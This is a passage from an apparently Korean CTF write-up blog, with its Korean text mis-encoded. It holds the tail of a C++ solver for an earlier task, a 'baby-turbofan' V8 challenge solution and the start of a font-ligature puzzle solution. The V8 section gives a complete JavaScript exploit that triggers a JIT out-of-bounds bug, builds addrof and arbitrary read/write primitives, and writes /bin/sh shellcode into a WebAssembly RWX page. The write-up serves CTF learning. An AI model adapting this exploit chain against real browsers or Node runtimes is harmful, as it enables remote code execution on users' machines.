        <span class="n">a</span><span class="p">[(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">64</span><span class="p">)</span><span class="o">%</span><span class="mi">16</span><span class="p">]</span><span class="o">=</span><span class="n">d</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
        <span class="n">a</span><span class="p">[(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">64</span><span class="p">)</span><span class="o">%</span><span class="mi">16</span><span class="p">]</span><span class="o">=</span><span class="n">d</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
        <span class="n">a</span><span class="p">[(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">+</span> <span class="mi">64</span><span class="p">)</span><span class="o">%</span><span class="mi">16</span><span class="p">]</span><span class="o">=</span><span class="n">d</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
        <span class="n">a</span><span class="p">[(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">+</span> <span class="mi">64</span><span class="p">)</span><span class="o">%</span><span class="mi">16</span><span class="p">]</span><span class="o">=</span><span class="n">d</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">inv_sub</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a</span><span class="p">[]){</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="n">inv_sbox</span><span class="p">[</span><span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]];</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="c1">// unsigned int a[]= {154, 93, 38, 210, 111, 102, 0, 197, 218, 246, 231, 246, 205, 56, 1, 249};</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="n">a</span><span class="o">=</span> <span class="n">comp</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">inv_sbox</span><span class="p">[</span><span class="n">sbox</span><span class="p">[</span><span class="n">i</span><span class="p">]]</span><span class="o">=</span><span class="n">i</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">_</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">_</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">;</span> <span class="n">_</span><span class="o">++</span><span class="p">){</span>
        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0xC0FF33</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
            <span class="n">sub</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
            <span class="n">shift_row</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
            <span class="n">enc</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0xC0FF33</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
            <span class="n">inv_enc</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
            <span class="n">inv_shift_row</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
            <span class="n">inv_sub</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>

            <span class="n">xr</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">x</span><span class="p">);</span>

            <span class="n">inv_enc</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
            <span class="n">inv_shift_row</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
            <span class="n">inv_sub</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
        <span class="n">a</span> <span class="o">+=</span> <span class="mi">16</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><h2 id="k-baby-turbofan---pwnable">K. baby-turbofan - Pwnable<a href="#k-baby-turbofan---pwnable" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>ì²˜ìŒìœ¼ë¡œ í’€ì–´ë³¸ V8 ë¬¸ì œì´ë‹¤.</p><p>ë¬¸ì œì˜ ë””ìŠ¤í¬ë¦½ì…˜ì—ì„œ ì–¸ê¸‰ë˜ëŠ” <code class="language-plaintext highlighter-rouge">Krautflare</code>ëŠ” ì•½ê°„ ì˜ˆì „ PlaidCTFì˜ <code class="language-plaintext highlighter-rouge">ropasaurusrex</code> ì •ë„ì˜ ê°ì„±ìœ¼ë¡œ ìì£¼ ì–¸ê¸‰ë˜ëŠ” ì…ë¬¸ìš© ë¬¸ì œì¸ ê²ƒ ê°™ì•„ë³´ì˜€ë‹¤.<br /> í•´ë‹¹ ë¬¸ì œì—ì„œëŠ” ìœ„ì™€ ë™ì¼í•œ ì·¨ì•½ì ì„ ê°–ê³  ìˆì—ˆì§€ë§Œ, <code class="language-plaintext highlighter-rouge">pointer compression</code>ì´ ì ìš©ëœ ë²„ì „ì´ë¼ëŠ” ì°¨ì´ê°€ ì¡´ì¬í•˜ì˜€ë‹¤.</p><p>V8ì— ëŒ€í•œ ì§€ì‹ì´ ì „ë¬´í–ˆìœ¼ë¯€ë¡œ ë‹¤ë¥¸ ë¬¸ì œì˜ exploitì„ ì§œì§‘ê¸°í•´ì„œ ë””ë²„ê¹…í•˜ëŠ” ë°©ì‹ìœ¼ë¡œ ë°©í–¥ì„ ì •í•˜ì˜€ê³ <br /> ì§€ê¸ˆì€ ì¹´ì´ìŠ¤íŠ¸ìƒì¸ ê³ ë“±í•™êµ í›„ë°°ì˜ ë¸”ë¡œê·¸ ê¸€ì„ ë§ì´ ì°¸ê³ í•˜ì—¬ í’€ì´í•˜ì˜€ë‹¤.<br /> íŠ¹íˆ <a href="https://sunrinjuntae.tistory.com/171">35C3-Krautflare</a>ì™€ <a href="https://sunrinjuntae.tistory.com/172">DownUnder-Is this pwn or web?</a>ì„ ì£¼ë¡œ ì°¸ê³ í•˜ì˜€ë‹¤.</p><p>ìœ„ ê¸€ì— ì í˜€ìˆëŠ” ìì„¸í•œ ì·¨ì•½ì  ì„¤ëª…ì€ ìƒëµí•˜ê³  ë‚´ê°€ í’€ì´í–ˆë˜ ë°©ë²•ì€ ì•„ë˜ì™€ ê°™ë‹¤.</p><ol><li><code class="language-plaintext highlighter-rouge">Object.is(-0, -0) * index</code>ë¥¼ ì´ìš©í•˜ì—¬ OOB ë°œìƒ<li>OOBë¥¼ í†µí•´ í™ í¬ì¸í„° ë² ì´ìŠ¤ LEAK<li>ê°ì²´ ë¦¬ìŠ¤íŠ¸ì— ê°’ì„ ë„£ê³  OOBë¥¼ ì´ìš©í•´ ê°ì²´ì˜ ì£¼ì†Œ LEAK<li>ë™ì ë””ë²„ê¹…ì„ ì´ìš©í•˜ì—¬ ì•Œì•„ë‚¸ <code class="language-plaintext highlighter-rouge">ArrayBuffer</code>ì˜ <code class="language-plaintext highlighter-rouge">backing store</code>ìœ„ì¹˜ë¥¼ OOBë¥¼ í†µí•´ ì ‘ê·¼í•˜ì—¬ aar, aaw<li>ì‰˜ì½”ë“œ ì‹¤í–‰</ol><p>ì •ë¦¬í•˜ë©´ ì œëª©ì˜ babyê°€ ë¬´ìƒ‰í•˜ì§€ ì•Šì„ ìƒë‹¹íˆ ê°„ë‹¨í•œ ë¬¸ì œì˜€ì§€ë§Œ<br /> ì´í•´í•˜ê³ , ì˜¤í”„ì…‹ì„ êµ¬í•˜ê¸° ìœ„í•´ ê°ì²´ë“¤ì„ ë¶™ì´ê³ , êµ¬í˜„í•˜ëŠ” ë°ì— ì°¸ ë§ì€ ì‹œê°„ì´ ë“¤ì—ˆë‹¤.</p><p>ë¬´ì–¸ê°€ í•˜ë‚˜ í¬ê²Œ ì–»ì–´ê°„ ë¬¸ì œì˜€ë˜ ê²ƒ ê°™ë‹¤.</p><blockquote><p>Exploit Script</p></blockquote><div class="language-js highlighter-rouge"><div class="code-header"> <span label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
</pre><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">f64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Float64Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">u64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint32Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>

<span class="kd">const</span> <span class="nx">print</span> <span class="o">=</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span>

<span class="kd">var</span> <span class="nx">tmp_obj</span> <span class="o">=</span> <span class="p">{</span><span class="na">X</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span>

<span class="kd">function</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
   <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">);</span>
   <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
   <span class="k">return</span> <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="p">}</span>
<span class="kd">function</span> <span class="nx">hex</span><span class="p">(</span><span class="nx">val</span><span class="p">){</span>
   <span class="k">return</span> <span class="dl">"</span><span class="s2">0x</span><span class="dl">"</span><span class="o">+</span><span class="nx">val</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
<span class="p">}</span>

<span class="kd">var</span> <span class="nx">oob</span> <span class="o">=</span> <span class="kc">undefined</span><span class="p">,</span> <span class="nx">oo</span> <span class="o">=</span> <span class="kc">undefined</span><span class="p">,</span> <span class="nx">arb</span> <span class="o">=</span> <span class="kc">undefined</span>
<span class="kd">function</span> <span class="nx">foo</span><span class="p">(</span><span class="nx">x</span><span class="p">){</span>
   <span class="kd">let</span> <span class="nx">aux</span> <span class="o">=</span> <span class="p">{</span><span class="na">mz</span><span class="p">:</span><span class="o">-</span><span class="mi">0</span><span class="p">};</span>
   <span class="kd">let</span> <span class="nx">idx</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">is</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">expm1</span><span class="p">(</span><span class="nx">x</span><span class="p">),</span> <span class="nx">aux</span><span class="p">.</span><span class="nx">mz</span><span class="p">);</span>
   <span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="p">[</span><span class="mf">0.1</span><span class="p">,</span><span class="mf">0.2</span><span class="p">,</span><span class="mf">0.3</span><span class="p">,</span><span class="mf">0.4</span><span class="p">,</span><span class="mf">0.5</span><span class="p">];</span>
   <span class="kd">let</span> <span class="nx">b</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">([</span>
      <span class="mh">0x1111111111111111</span><span class="nx">n</span><span class="p">,</span>
      <span class="mh">0x2222222222222222</span><span class="nx">n</span><span class="p">,</span>
      <span class="mh">0x3333333333333333</span><span class="nx">n</span><span class="p">,</span>
   <span class="p">]);</span>

   <span class="kd">let</span> <span class="nx">c</span> <span class="o">=</span> <span class="p">[</span><span class="nx">tmp_obj</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.2</span><span class="p">]</span>
   <span class="kd">let</span> <span class="nx">aaaa</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mh">0x1338</span><span class="p">);</span>


   <span class="nx">oob</span> <span class="o">=</span> <span class="nx">b</span>
   <span class="nx">oo</span> <span class="o">=</span> <span class="nx">c</span>
   <span class="nx">arb</span> <span class="o">=</span> <span class="nx">aaaa</span>

   <span class="nx">idx</span> <span class="o">*=</span> <span class="mi">25</span><span class="p">;</span>
   <span class="nx">a</span><span class="p">[</span><span class="nx">idx</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="mh">0xFFFFFFFF000023e8</span><span class="nx">n</span><span class="p">)</span>
   <span class="k">return</span> <span class="nx">a</span><span class="p">[</span><span class="nx">idx</span><span class="p">];</span>
<span class="p">}</span>

<span class="nx">foo</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="k">for</span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">100000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">foo</span><span class="p">(</span><span class="dl">"</span><span class="s2">0</span><span class="dl">"</span><span class="p">);</span>
<span class="p">}</span>

<span class="nx">foo</span><span class="p">(</span><span class="o">-</span><span class="mi">0</span><span class="p">)</span>

<span class="kd">const</span> <span class="nx">base</span> <span class="o">=</span> <span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">oob</span><span class="p">[</span><span class="mi">9</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="nx">n</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span>
<span class="nx">print</span><span class="p">(</span><span class="dl">"</span><span class="s2">HEAP BASE : </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">hex</span><span class="p">(</span><span class="nx">base</span><span class="p">))</span>

<span class="kd">function</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">obj</span><span class="p">)</span> <span class="p">{</span>
   <span class="nx">oo</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">obj</span>
   <span class="k">return</span> <span class="nx">base</span> <span class="o">+</span> <span class="p">(</span><span class="nx">oob</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="nx">n</span><span class="p">)</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">aar</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
   <span class="nx">oob</span><span class="p">[</span><span class="mi">20</span><span class="p">]</span> <span class="o">=</span> <span class="nx">addr</span>
   <span class="kd">let</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="nx">arb</span><span class="p">);</span>

   <span class="k">return</span> <span class="nx">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">aaw</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
   <span class="nx">oob</span><span class="p">[</span><span class="mi">20</span><span class="p">]</span> <span class="o">=</span> <span class="nx">addr</span>

   <span class="k">if</span><span class="p">(</span><span class="k">typeof</span> <span class="nx">value</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">number</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>
      <span class="kd">let</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="nx">arb</span><span class="p">);</span>
      <span class="nx">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">value</span>
   <span class="p">}</span>

   <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="k">typeof</span> <span class="nx">value</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">string</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>
      <span class="kd">let</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">arb</span><span class="p">);</span>
      <span class="k">for</span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">value</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
         <span class="nx">buf</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">value</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">charCodeAt</span><span class="p">();</span>
      <span class="p">}</span>
   <span class="p">}</span>
<span class="p">}</span>

<span class="kd">let</span> <span class="nx">wasmCode</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">133</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">96</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">127</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">130</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">112</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">131</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">129</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">145</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">121</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">110</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">138</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">65</span><span class="p">,</span><span class="mi">42</span><span class="p">,</span><span class="mi">11</span><span class="p">]);</span>
<span class="kd">let</span> <span class="nx">wasmModule</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Module</span><span class="p">(</span><span class="nx">wasmCode</span><span class="p">);</span>
<span class="kd">let</span> <span class="nx">wasmInstance</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Instance</span><span class="p">(</span><span class="nx">wasmModule</span><span class="p">);</span>
     
<span class="kd">let</span> <span class="nx">wasmFunction</span> <span class="o">=</span> <span class="nx">wasmInstance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">main</span><span class="p">;</span>

<span class="kd">const</span> <span class="nx">Instance</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">wasmInstance</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">rwx</span> <span class="o">=</span> <span class="nx">aar</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">wasmInstance</span><span class="p">)</span><span class="o">+</span><span class="mh">0x5F</span><span class="nx">n</span><span class="p">)</span>
<span class="nx">print</span><span class="p">(</span><span class="dl">"</span><span class="s2">RWX : </span><span class="dl">"</span><span class="o">+</span><span class="nx">hex</span><span class="p">(</span><span class="nx">rwx</span><span class="p">))</span>

<span class="kd">let</span> <span class="nx">shellcode</span> <span class="o">=</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x48</span><span class="se">\</span><span class="s2">x31</span><span class="se">\</span><span class="s2">xf6</span><span class="se">\</span><span class="s2">x56</span><span class="se">\</span><span class="s2">x48</span><span class="se">\</span><span class="s2">xbf</span><span class="se">\</span><span class="s2">x2f</span><span class="se">\</span><span class="s2">x62</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x6e</span><span class="se">\</span><span class="s2">x2f</span><span class="se">\</span><span class="s2">x2f</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x68</span><span class="se">\</span><span class="s2">x57</span><span class="se">\</span><span class="s2">x54</span><span class="se">\</span><span class="s2">x5f</span><span class="se">\</span><span class="s2">x48</span><span class="se">\</span><span class="s2">x31</span><span class="se">\</span><span class="s2">xc0</span><span class="se">\</span><span class="s2">xb0</span><span class="se">\</span><span class="s2">x3b</span><span class="se">\</span><span class="s2">x99</span><span class="se">\</span><span class="s2">x4d</span><span class="se">\</span><span class="s2">x31</span><span class="se">\</span><span class="s2">xd2</span><span class="se">\</span><span class="s2">x0f</span><span class="se">\</span><span class="s2">x05</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">aaw</span><span class="p">(</span><span class="nx">rwx</span><span class="p">,</span> <span class="nx">shellcode</span><span class="p">)</span>

<span class="nx">wasmFunction</span><span class="p">()</span>

<span class="c1">// while(1); // for debug</span>

<span class="c1">// ##END_OF_FILE##</span>
</pre></table></code></div></div><h2 id="l-input-box---misc">L. input box - Misc<a href="#l-input-box---misc" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Fontì˜ GSUBì„ ì´ìš©í•˜ì—¬ ì˜¬ë°”ë¥¸ í”Œë˜ê·¸ê°€ ì…ë ¥ë˜ì—ˆë‹¤ë©´ GOOD ì´ë¯¸ì§€ë¥¼ ì¶œë ¥í•˜ëŠ” ë¬¸ì œì´ë‹¤.</p><p>ëŒ€ì¶© ì…ë ¥í•´ë³´ë©´ ì•„ìŠ¤í‚¤ ë²”ìœ„ì˜ ëª¨ë“  ë¬¸ìë“¤ì— ì–´ë– í•œ ì´ë¯¸ì§€ë„ ë§¤í•‘ì´ ë˜ì–´ìˆì§€ ì•Šì€ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤,</p><p>otfíŒŒì¼ì„ ttxë¡œ íŒŒì‹±í•´ì„œ ë³´ë©´ <code class="language-plaintext highlighter-rouge">G00979</code>ì˜ widthë§Œ ë‹¤ë¥¸ ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤.<br /> ë”°ë¼ì„œ í•´ë‹¹ <code class="language-plaintext highlighter-rouge">Glyph</code>ê°€ í”Œë˜ê·¸ì˜ ëì„ ì˜ë¯¸í•œë‹¤.<br /> í•´ë‹¹ <code class="language-plaintext highlighter-rouge">Glyph</code>ë¥¼ í¬í•¨í•˜ëŠ” <code class="language-plaintext highlighter-rouge">Ligature</code>ë¥¼ ê°–ê³  ìˆëŠ” <code class="language-plaintext highlighter-rouge">LigatureSet</code>ì„ ì°¾ìœ¼ë©´<br /> <code class="language-plaintext highlighter-rouge">Glyph G00923</code>ë¥¼ ì†ì„±ìœ¼ë¡œ ê°–ëŠ” <code class="language-plaintext highlighter-rouge">LigatureSet</code>ì´ <code class="language-plaintext highlighter-rouge">G00979</code>ë¥¼ <code class="language-plaintext highlighter-rouge">Component=braceright</code>ì¸ <code class="language-plaintext highlighter-rouge">Ligature</code>ë¡œ ê°–ê³  ìˆë‹¤.<br /> ë”°ë¼ì„œ í”Œë˜ê·¸ì˜ ë§ˆì§€ë§‰ ê¸€ìëŠ” <code class="language-plaintext highlighter-rouge">}</code></p><p><code class="language-plaintext highlighter-rouge">Glyph G00923</code>ë¥¼ í¬í•¨í•˜ëŠ” <code class="language-plaintext highlighter-rouge">Ligature</code>ë¥¼ ê°–ê³  ìˆëŠ” <code class="language-plaintext highlighter-rouge">LigatureSet</code>ì„ ì°¾ìœ¼ë©´<br /> <code class="language-plaintext highlighter-rouge">Glyph G00877</code>ë¥¼ ì†ì„±ìœ¼ë¡œ ê°–ëŠ” <code class="language-plaintext highlighter-rouge">LigatureSet</code>ì´ <code class="language-plaintext highlighter-rouge">G00923</code>ë¥¼ <code class="language-plaintext highlighter-rouge">Component=numbersign</code>ì¸ <code class="language-plaintext highlighter-rouge">Ligature</code>ë¡œ ê°–ê³  ìˆë‹¤.<br /> ë”°ë¼ì„œ í”Œë˜ê·¸ì˜ ë§ˆì§€ë§‰ì—ì„œ ë‘ë²ˆì§¸ ê¸€ìëŠ” <code class="language-plaintext highlighter-rouge">#</code></p><p>ì´ëŸ¬í•œ ë°˜ë³µí•˜ë©´ í”Œë˜ê·¸ë¥¼ ì–»ì„ìˆ˜ ìˆì—ˆë‹¤.</p><p>íŒŒì‹± ì½”ë“œë¥¼ ì§¤ ì‹œê°„ì— ì†ìœ¼ë¡œ êµ¬í•˜ê³  ë§Œë‹¤ëŠ” ë§ˆì¸ë“œë¡œ <code class="language-plaintext highlighter-rouge">Ctrl+F</code>ë¥¼ ì´ìš©í•´ì„œ í’€ì—ˆê¸° ë•Œë¬¸ì— ì½”ë“œê°€ ì—†ë‹¤.</p><p>ë¬¸ì œì˜ ê²°ì€ ë§ì´ ë‹¤ë¥´ì§€ë§Œ í”Œë˜ê·¸ë¥¼ ì½ê³  <a href="https://ctftime.org/task/16443">redpwn 2021ì— ì¶œì œëœ misc ë¬¸ì 